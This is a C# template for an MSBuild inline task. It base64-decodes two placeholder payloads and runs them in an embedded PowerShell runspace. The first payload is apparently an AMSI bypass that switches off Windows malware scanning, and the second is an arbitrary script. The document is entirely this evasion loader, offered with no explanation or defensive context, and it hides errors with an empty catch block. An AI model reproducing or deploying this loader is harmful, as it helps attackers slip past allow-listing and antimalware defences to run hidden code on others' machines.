Task.Code:

			using System;
			using System.Collections.ObjectModel;
			using System.Management.Automation;
			using System.Management.Automation.Runspaces;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;

			public class n: Task, ITask
			{
				public override bool Execute()
				{
          string ampsee = "~~AMSI~~";
				  string cmnd = "~~SCRIPT~~";

					PowerShell p = PowerShell.Create();
					p.AddScript(b64d(ampsee));
					p.Invoke();

					p.AddScript(b64d(cmnd));
					Collection<PSObject> output = null;
					output = p.Invoke();

					try
					{
						foreach (PSObject rtnItem in output)
						{
							Console.WriteLine(rtnItem.ToString());
						}
					}
					catch(Exception e){}
					return true;
				}
				public static string b64d(string text) {
				return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(text));
				}
			}
